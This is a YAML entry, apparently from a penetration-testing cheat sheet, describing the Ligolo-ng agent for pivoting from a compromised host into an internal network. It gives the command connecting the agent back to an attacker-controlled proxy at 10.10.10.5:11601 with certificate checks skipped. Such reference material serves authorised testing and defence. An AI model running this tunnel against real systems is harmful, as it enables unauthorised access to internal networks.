---
description: |
  The Ligolo-ng agent binary is executed on a compromised host to establish an encrypted connection back to the attacker-controlled ligolo-ng proxy. Once connected, the attacker adds the agent's session and a route on their TUN interface, allowing them to interact with the target's internal network as if directly connected, without spawning a SOCKS proxy for every tool. The -ignore-cert flag skips certificate validation, which is required when the proxy is using a self-signed certificate.

  Command Reference:

  	Attacker IP: 10.10.10.5

  	Listen Port: 11601

command: |
  agent -connect 10.10.10.5:11601 -ignore-cert
items:
  - Shell
OS:
  - Linux
  - Windows
phases:
  - Pivoting
references:
  - https://github.com/nicocha30/ligolo-ng
---
